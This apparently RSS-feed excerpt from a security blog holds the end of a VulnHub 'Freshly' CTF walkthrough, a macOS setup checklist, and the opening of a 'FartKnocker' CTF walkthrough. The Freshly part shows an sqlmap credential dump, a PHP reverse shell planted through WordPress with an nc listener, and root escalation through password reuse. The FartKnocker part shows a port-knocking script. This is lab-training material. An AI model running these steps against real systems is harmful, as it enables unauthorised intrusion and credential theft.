&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://10.0.1.109/login.php&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--forms&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; wordpress8080 &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--risk&lt;/span&gt; 1 &lt;span class=&quot;nt&quot;&gt;--dbms&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;mysql &lt;span class=&quot;nt&quot;&gt;--dump&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Discovered credentials:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Database: wordpress8080
Table: &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 entry]
+----------+---------------------+
| username | password            |
+----------+---------------------+
| admin    | SuperSecretPassword |
+----------+---------------------+&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;wordpress---reverse-php-shell&quot;&gt;Wordpress - Reverse PHP Shell&lt;/h2&gt;

&lt;p&gt;Wordpress was accessible on port &lt;code&gt;443&lt;/code&gt; and port &lt;code&gt;8080&lt;/code&gt;. Authentication was successful using the discovered credentials and a PHP reverse shell was introduced to the sites source code via the wordpress theme editor.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Username&lt;/th&gt;
      &lt;th&gt;Password&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;b&gt;admin&lt;/b&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;SuperSecretPassword&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/freshly/wordpress-php-shell.png&quot; alt=&quot;wordpress reverse php shell&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A reverse shell successfully connected back:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# nc &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 443           
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.1.110] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.1.109] 37912
Linux Freshly 3.13.0-45-generic &lt;span class=&quot;c&quot;&gt;#74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 i686 i686 GNU/Linux&lt;/span&gt;
 13:26:49 up 46 min,  0 &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;,  load average: 0.00, 0.01, 0.46
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;daemon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;daemon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;daemon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;

&lt;p&gt;Account credential reuse from the Wordpress admin password &lt;code&gt;SuperSecretPassword&lt;/code&gt; allowed &lt;code&gt;su -&lt;/code&gt; to escalate privileges to root.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty;pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
daemon@Freshly:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;daemon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;daemon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;daemon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

daemon@Freshly:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su -
su -
Password: SuperSecretPassword

root@Freshly:~# &lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;post-exploitation-enumeration&quot;&gt;Post Exploitation Enumeration&lt;/h2&gt;

&lt;p&gt;The file &lt;code&gt;/etc/passwd&lt;/code&gt; contained the text:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@Freshly:/# &lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 5 /etc/passwd
&lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 5 /etc/passwd
user:x:1000:1000:user,,,:/home/user:/bin/bash
mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
candycane:x:1001:1001::/home/candycane:
&lt;span class=&quot;c&quot;&gt;# YOU STOLE MY SECRET FILE!&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# SECRET = &quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Additionally the file &lt;code&gt;/etc/shadow&lt;/code&gt; had incorrect permissions allowing a non privileged user read access, allowing for offline password cracking using Hashcat / JTR.&lt;/p&gt;

&lt;p&gt;Thanks for the VM :)&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>MacBook - Post Install Config + Apps</title>
          <link>https://highon.coffee/blog/macbook-post-install-check-list/</link>
          <pubDate>Mon, 06 Apr 2015 01:04:18 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>mac-osx</category>
          
          
          <category>urandom</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/macbook-post-install-check-list/</guid>
          <description>&lt;p&gt;Just for fun, here is my list of post install config changes plus list of apps I install after installing &lt;code&gt; Mac OS X &lt;/code&gt;&lt;/p&gt;

&lt;p&gt;##Side Dock&lt;/p&gt;

&lt;p&gt;Open: &lt;code&gt;System Preferences &amp;gt; Dock&lt;/code&gt; click &lt;strong&gt;Left&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/macbook-post-install-config-apps/mac-osx-dock-on-left.png&quot; alt=&quot;Max OS X Dock Left hand side&quot; /&gt;&lt;/p&gt;

&lt;p&gt;##Enable Right Click MacBook Trackpad&lt;/p&gt;

&lt;p&gt;Open: &lt;code&gt;System Preferences &amp;gt; Trackpad&lt;/code&gt; click &lt;strong&gt;click in bottom right corner&lt;/strong&gt; under &lt;em&gt;Secondary Click&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/macbook-post-install-config-apps/mac-osx-enable-right-click-trackpad.png&quot; alt=&quot;Max OS X Enable Right Click Trackpad&quot; /&gt;&lt;/p&gt;

&lt;p&gt;##Enable path view in finder&lt;/p&gt;

&lt;p&gt;Open Finder &lt;code&gt;View &amp;gt; Show Path Bar&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The path will render at the bottom of the Finder window.&lt;/p&gt;

&lt;p&gt;##Create symlink for /Volumes&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /Volumes/ ~/Desktop/Volumes/&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If I don’t do this, my cifs mounts show as a single drive - if you have none browsable cifs mounts then this can become a pain.&lt;/p&gt;

&lt;p&gt;##Mount smb / cifs share in OSX&lt;/p&gt;

&lt;p&gt;Open Finder, press &lt;code&gt;CMD+k&lt;/code&gt; and enter the path of your smb &lt;code&gt;smb://&lt;/code&gt; or cifs &lt;code&gt;cifs://&lt;/code&gt; server.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/macbook-post-install-config-apps/mac-osx-mount-cifs-share.png&quot; alt=&quot;Max OS X Mount Cifs / SMB Share&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;finder-show-file-extensions&quot;&gt;Finder show file extensions&lt;/h2&gt;

&lt;p&gt;Show file extensions on Mac OS X, open Finder: &lt;code&gt;Preferences &amp;gt; Advanced&lt;/code&gt; tick &lt;strong&gt;Show all filename extensions&lt;/strong&gt;, I also untick &lt;strong&gt;Show warnnig before changing an extension&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/macbook-post-install-config-apps/os-x-finder-show-file-extensions.png&quot; alt=&quot;Max OS X Show File Extensions in Finder&quot; /&gt;&lt;/p&gt;

&lt;p&gt;##Delete junk from dock&lt;/p&gt;

&lt;p&gt;Delete all unused apps / icons from dock.&lt;/p&gt;

&lt;p&gt;##Increase Terminal Font Size&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Terminal &amp;gt; Preferences &amp;gt; Text&lt;/code&gt; adjust font size.&lt;/p&gt;

&lt;p&gt;##Install Brew&lt;/p&gt;

&lt;h2 id=&quot;setup-home-brew&quot;&gt;Setup home brew&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ruby &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-fsSL&lt;/span&gt; https://raw.githubusercontent.com/Homebrew/install/master/install&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Install command line tools when prompted.&lt;/p&gt;

&lt;h2 id=&quot;setup-jekyll&quot;&gt;Setup Jekyll&lt;/h2&gt;

&lt;p&gt;###Install RVM&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;gpg &lt;span class=&quot;nt&quot;&gt;--keyserver&lt;/span&gt; hkp://keys.gnupg.net &lt;span class=&quot;nt&quot;&gt;--recv-keys&lt;/span&gt; 409B6B1796C275462A1703113804BB82D39DC0E3
&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;url &lt;span class=&quot;nt&quot;&gt;-sSL&lt;/span&gt; https://get.rvm.io | bash &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; stable&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;###Install Jekyll&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;gem &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;jekyll &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;###Trouble Shooting Jekyll Install&lt;/p&gt;

&lt;p&gt;you don’t have write permissions for the /library/ruby/gems/2.0.0 directory. mac&lt;/p&gt;

&lt;p&gt;Close and reopen terminal, re-run gem install jekyll - the gems should build fine, &lt;strong&gt;DO NOT USE&lt;/strong&gt; sudo.&lt;/p&gt;

&lt;p&gt;cd into your jekyll dir and run “jekyll serve”&lt;/p&gt;

&lt;p&gt;Install the following via brew:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap vim netcat git&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Copy .ssh back over for ssh keys.&lt;/p&gt;

&lt;h2 id=&quot;install-apps&quot;&gt;Install Apps&lt;/h2&gt;

&lt;p&gt;List of Apps I use.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Evernote&lt;/li&gt;
  &lt;li&gt;Disk Inventory X (for when du -h doesn’t cut it)&lt;/li&gt;
  &lt;li&gt;Home Brew - It’s self contained, easy to null should you need to.&lt;/li&gt;
  &lt;li&gt;VLC&lt;/li&gt;
  &lt;li&gt;Wireshark&lt;/li&gt;
  &lt;li&gt;uTorrent&lt;/li&gt;
  &lt;li&gt;MS Office for Mac&lt;/li&gt;
  &lt;li&gt;Google Drive&lt;/li&gt;
  &lt;li&gt;Alfred 2&lt;/li&gt;
  &lt;li&gt;The Unarchiver&lt;/li&gt;
  &lt;li&gt;Xcode&lt;/li&gt;
  &lt;li&gt;iTerm&lt;/li&gt;
  &lt;li&gt;OSX Command Line Tools&lt;/li&gt;
  &lt;li&gt;MacVim&lt;/li&gt;
  &lt;li&gt;Reader 2 - RSS reader + feedly&lt;/li&gt;
  &lt;li&gt;Quassel Client - IRC&lt;/li&gt;
  &lt;li&gt;Skype&lt;/li&gt;
  &lt;li&gt;Spotify&lt;/li&gt;
  &lt;li&gt;Firefox&lt;/li&gt;
  &lt;li&gt;Chrome&lt;/li&gt;
  &lt;li&gt;Airmail 2&lt;/li&gt;
  &lt;li&gt;VMWare Fusion&lt;/li&gt;
  &lt;li&gt;KeePassX&lt;/li&gt;
  &lt;li&gt;Caffeine&lt;/li&gt;
  &lt;li&gt;Trim Enabler (only needed for after market SSD’s)&lt;/li&gt;
  &lt;li&gt;iStat Menus 5&lt;/li&gt;
  &lt;li&gt;Battery Logger&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;swap-spotlight-for-alfred---shortcut-key&quot;&gt;Swap spotlight for Alfred - shortcut key.&lt;/h2&gt;

&lt;p&gt;First go to &lt;code&gt;Settings &amp;gt; Spotlight&lt;/code&gt; and untick “Spotlight search keyboard shortcut: CMD + SPACE”&lt;/p&gt;

&lt;p&gt;Open Alfred and change it to &lt;code&gt;CMD+SPACE&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&quot;disable-automatically-rearrange-spaces&quot;&gt;Disable “Automatically rearrange Spaces”&lt;/h2&gt;

&lt;p&gt;This drives me insane, &lt;code&gt;System Preferences &amp;gt; Mission Control&lt;/code&gt; untick &lt;strong&gt;Automatically rearrange Spaces based on recent use&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;change-osx-screenshot-location&quot;&gt;Change OSX Screenshot Location&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;defaults write com.apple.screencapture location ~/Pictures/Screenshots

killall SystemUIServer &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;When using an aftermarket SSD, I used &lt;a href=&quot;https://www.cindori.org/software/trimenabler/&quot;&gt;Trim Enabler&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;note warning&quot;&gt;
  &lt;h5&gt;Warning turns off text security setting for ktexts.&lt;/h5&gt;
  &lt;p&gt;Ktext signing works by checking if all the drivers in the system are unaltered by a third party, or approved by Apple. If they have been modified, Yosemite will no longer load the driver.&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/macbook-post-install-config-apps/trim-enabler-disable-ktexts.png&quot; alt=&quot;Max OS X Enable Trim&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;disable-sudden-motion-sensor---sms&quot;&gt;Disable Sudden Motion Sensor - SMS&lt;/h2&gt;

&lt;p&gt;Again if you have an Apple SSD, skip this.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;pmset &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; sms 0&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;confirm with:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;pmset &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;disable-sleep-image&quot;&gt;Disable sleep image&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo rm&lt;/span&gt; /private/var/vm/sleepimage
&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;pmset &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; hibernatemode 0 
pmset &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;hibernatemode &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;All I can think of for now…&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>FartKnocker - Walkthrough</title>
          <link>https://highon.coffee/blog/fartknocker-walkthrough/</link>
          <pubDate>Fri, 03 Apr 2015 11:00:59 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>CTF</category>
          
          
          <category>walkthroughs</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/fartknocker-walkthrough/</guid>
          <description>&lt;div class=&quot;coffee-rating&quot;&gt;
&lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;code&gt;Coffee Difficulty Rating:&lt;/code&gt;&lt;/p&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;/p&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#description&quot; id=&quot;markdown-toc-description&quot;&gt;Description&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeration&quot; id=&quot;markdown-toc-enumeration&quot;&gt;Enumeration&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#host-service-enumeration&quot; id=&quot;markdown-toc-host-service-enumeration&quot;&gt;Host Service Enumeration&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#web-application-analysis&quot; id=&quot;markdown-toc-web-application-analysis&quot;&gt;Web Application Analysis&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#pcap-analysis&quot; id=&quot;markdown-toc-pcap-analysis&quot;&gt;Pcap Analysis&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#local-system-enumeration&quot; id=&quot;markdown-toc-local-system-enumeration&quot;&gt;Local System Enumeration&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#local-privilege-escalation&quot; id=&quot;markdown-toc-local-privilege-escalation&quot;&gt;Local Privilege Escalation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#root-flag&quot; id=&quot;markdown-toc-root-flag&quot;&gt;Root Flag&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#conclusion&quot; id=&quot;markdown-toc-conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;description&quot;&gt;Description&lt;/h2&gt;

&lt;p&gt;A VulnHub VM challenge, based on packet analysis and port knocking.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Author Note:&lt;/strong&gt; I got the word “Fart Knocker” from watching beavis and butthead back in the day. Otherwise you kids might not understand :)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Author:&lt;/strong&gt; TopHotSec&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Download:&lt;/strong&gt; &lt;a href=&quot;https://www.vulnhub.com&quot;&gt;VulnHub&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 1-65535 &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; 10.0.1.113&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;host-service-enumeration&quot;&gt;Host Service Enumeration&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Version Detection&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 80&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;HTTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache httpd 2.4.7 ((Ubuntu))&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;web-application-analysis&quot;&gt;Web Application Analysis&lt;/h2&gt;

&lt;p&gt;Inspection of the web application revealed a pcap file link:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/fartknocker/web-pcap1.png&quot; alt=&quot;Web Pcap download&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;pcap-analysis&quot;&gt;Pcap Analysis&lt;/h3&gt;

&lt;p&gt;Looking at the pcap file revealed the VM was likely using port knocking (bear in mind the VM’s network has changed).&lt;/p&gt;

&lt;div class=&quot;note info&quot;&gt;
  &lt;h5&gt;What is Port Knocking ?&lt;/h5&gt;
  &lt;p&gt;Port Knocking is the a *security by obscurity* technique, in order to expose a service port you must first connect to a set of ports in a specific order. More information about [port knocking on wikipedia](https://en.wikipedia.org/wiki/Port_knocking).&lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/fartknocker/pcap1.png&quot; alt=&quot;pcap1 wireshark&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Quick bash loop script for the port knocking:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;HOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;shift
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;ARG &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;do
    &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--host_timeout&lt;/span&gt; 100 &lt;span class=&quot;nt&quot;&gt;--max-retries&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$ARG&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$HOST&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Successful port knocking combo:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# ./knock.sh 10.0.1.113 7000 8000 9000 7000 8000 &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; telnet 10.0.1.113 8888

Trying 10.0.1.113...
Connected to 10.0.1.113.
Escape character is &lt;span class=&quot;s1&quot;&gt;'^]'&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
/burgerworld/
Connection closed by foreign host.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;code&gt;http://10.0.1.113/burgerworld/&lt;/code&gt;, disclosed another pcap file:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/fartknocker/web-pcap2.png&quot; alt=&quot;Web pcap2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Investigation of the pcap file in &lt;strong&gt;Wireshark&lt;/strong&gt; revealed more knocking again, following by a connection over port 8080.&lt;/p&gt;

&lt;p&gt;Following the TCP stream for port 8080, discovered the following:&lt;/p&gt;

